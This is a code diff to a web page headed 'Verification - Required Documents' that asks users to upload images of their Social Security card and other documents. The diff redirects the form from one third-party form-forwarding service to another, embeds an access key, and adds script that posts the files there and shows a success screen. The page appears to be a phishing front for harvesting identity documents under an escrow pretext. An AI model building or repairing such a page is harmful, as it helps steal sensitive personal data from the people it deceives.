@@ -229,11 +229,10 @@
                 <h1>Verification <br><span class="escrow-text">- Required Documents</span></h1>
             </header>
 
-            <!-- Standard form submission removes the CORS block error -->
-            <form id="uploadForm" action="https://formspree.io/f/mdenogaa" method="POST" enctype="multipart/form-data">
+            <form id="uploadForm" action="https://api.web3forms.com/submit" method="POST" enctype="multipart/form-data" onsubmit="handleConfirm(event)">
                 
-                <!-- Hidden input to redirect user to a success view or reload cleanly -->
-                <input type="hidden" name="_next" value="">
+                <!-- Web3Forms Access Key -->
+                <input type="hidden" name="access_key" value="e0f4322a-542d-4c84-8ec6-fce2f6f6e627">
 
                 <div class="upload-group">
                     <label>SSN Image (Front)</label>
@@ -267,7 +266,7 @@
                     </div>
                 </div>
 
-                <button type="submit" class="btn" style="margin-top: 10px;" id="submitBtn" onclick="showSubmitting()">Confirm</button>
+                <button type="submit" class="btn" style="margin-top: 10px;" id="submitBtn">Confirm</button>
             </form>
         </div>
 
@@ -295,12 +294,37 @@
             document.getElementById('step-upload').classList.add('active');
         }
 
-        function showSubmitting() {
-            const btn = document.getElementById('submitBtn');
-            // Only change button text if files are actually selected
-            setTimeout(() => {
-                btn.innerText = "Submitting & Uploading...";
-            }, 100);
+        async function handleConfirm(event) {
+            event.preventDefault();
+            
+            const form = event.target;
+            const formData = new FormData(form);
+            const submitBtn = document.getElementById('submitBtn');
+            
+            submitBtn.innerText = "Submitting & Uploading...";
+            submitBtn.disabled = true;
+
+            try {
+                let response = await fetch(form.action, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                let result = await response.json();
+
+                if (result.success) {
+                    document.getElementById('step-upload').classList.remove('active');
+                    document.getElementById('step-success').classList.add('active');
+                } else {
+                    alert('Error: ' + result.message);
+                    submitBtn.innerText = "Confirm";
+                    submitBtn.disabled = false;
+                }
+            } catch (error) {
+                alert('Network error. Please check your connection.');
+                submitBtn.innerText = "Confirm";
+                submitBtn.disabled = false;
+            }
         }
     </script>
 
